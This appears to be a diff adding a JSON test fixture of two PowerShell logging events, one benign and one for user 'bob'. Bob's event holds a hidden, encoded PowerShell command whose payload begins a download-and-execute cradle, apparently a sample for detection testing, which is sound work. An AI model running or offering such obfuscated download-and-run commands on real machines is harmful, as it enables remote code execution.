@@ -1,0 +1,20 @@
+[
+  {
+    "event_code": "4104",
+    "timestamp": "2026-07-20T20:06:40Z",
+    "user": "bob",
+    "hostname": "WKS-BOB-01",
+    "source_ip": "192.0.2.20",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+    "status": "success"
+  },
+  {
+    "event_code": "4104",
+    "timestamp": "2026-07-20T20:10:00Z",
+    "user": "charlie",
+    "hostname": "WKS-CHARLIE-01",
+    "source_ip": "192.0.2.30",
+    "command_line": "Get-Service | Where-Object {$_.Status -eq 'Stopped'} | Format-Table",
+    "status": "success"
+  }
+]
